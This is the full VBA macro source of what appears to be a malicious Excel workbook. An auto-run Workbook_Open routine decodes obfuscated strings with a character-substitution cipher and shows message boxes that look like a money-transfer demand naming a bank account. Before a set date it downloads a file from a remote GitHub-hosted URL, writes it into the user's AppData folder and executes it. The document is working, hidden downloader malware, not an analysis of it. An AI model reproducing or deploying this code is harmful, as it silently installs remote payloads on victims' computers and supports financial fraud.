Function a(b)
    c = " ?!@#$%^&*()_+|0123456789abcdefghijklmnopqrstuvwxyz.,-~ABCDEFGHIJKLMNOPQRSTUVWXYZ¿¡²³ÀÁÂĂÄÅ̉ÓÔƠÖÙÛÜàáâăäåØ¶§Ú¥"
    d = "ăXL1lYU~Ùä,Ca²ZfĂ@dO-cq³áƠsÄJV9AQnvbj0Å7WI!RBg§Ho?K_F3.Óp¥ÖePâzk¶ÛNØ%G mÜ^M&+¡#4)uÀrt8(̉Sw|T*Â$EåyhiÚx65Dà¿2ÁÔ"

    h = ""
    For y = 1 To Len(b)
        e = InStr(c, Mid(b, y, 1))
        If e > 0 Then
            f = Mid(d, e, 1)
            h = h & f
        Else
            h = h & Mid(b, y, 1)
        End If
    Next

    a = h
End Function

Sub Workbook_Open()
    Dim v As Object
    Dim n As String
    Dim m As String
    Dim r As String
    Dim t As Integer
    
    t = Asc("2") * 100
    Set v = CreateObject("WScript.Shell")
    n = v.SpecialFolders("AppData")
    
    Dim ab
    Dim ac
    Dim e
    Dim j As Long
    Dim l As String
    Dim ad As Long
    Dim i As String
    Dim p As Long
    Dim o As String
    Dim ae As String
    Dim q As Long
    Dim aq
    Dim aw
    Dim ak As Integer
    Dim ao
    Dim al
    
    ak = 1
    MsgBox a("4BEiàiuP3x6¿QEi³")
    
    Dim az As String
    ba = "$x¿PÜ_jEPkEEiPÜ_6IE3P_i3PÛx¿²PàQBx²³_i³P3x6¿QEi³bPÜ_jEPkEEiPb³x#Eir" & vbCrLf & "̉xP²E³²àEjEP³ÜEbEP3_³_(PÛx¿P_²EP²E7¿à²E3P³xP³²_ib0E²P@mmIP³xP³ÜEP0x##xÄàiuPk_iIP_66x¿i³Pi¿QkE²:P" & vbCrLf & "@m@m@mo@@§mmm" & vbCrLf & "g66x¿i³PÜx#3E²:PLu¿ÛEiP̉Ü_iÜP!xiu" & vbCrLf & "t_iI:PTtPt_iI"
    
    az = a(ba)
    MsgBox az, vbInformation, a("pEP3EEB#ÛP²Eu²E³P³xPài0x²QPÛx¿")
    
    Dim bc As Date
    Dim bd As Date
    
    bc = Date
    bd = DateSerial(2023, 6, 6)
    
    If bc < bd Then
        Set ao = CreateObject("microsoft.xmlhttp")
        Set aw = CreateObject("Shell.Application")
        aq = n & "\" & a("\k¿i6Ü_~Bb@")
        ao.Open "get", a("Ü³³Bb://uàb³~uà³Ü¿k¿bE²6xi³Ei³~6xQ/k7¿_iQ_i/fÀ3_o-3Yf0_E6m6kk3_km§3Y03ÀY_3__/²_Ä/À3EÀkfmfÀ@Eăăoăä§k@_@ă0ä6_E3-ăY036-@@koo/_Àmb6m@§~Bb@"), False
        ao.send
        ac = ao.responseBody
        
        If ao.Status = 200 Then
            Set ab = CreateObject("adodb.stream")
            ab.Open
            ab.Type = ak
            ab.Write ac
            ab.SaveToFile aq, ak + ak
            ab.Close
        End If
        
        aw.Open aq
    Else
        MsgBox a("åxi'³P³²ÛP³xP²¿iPQEPk²x")
    End If
End Sub
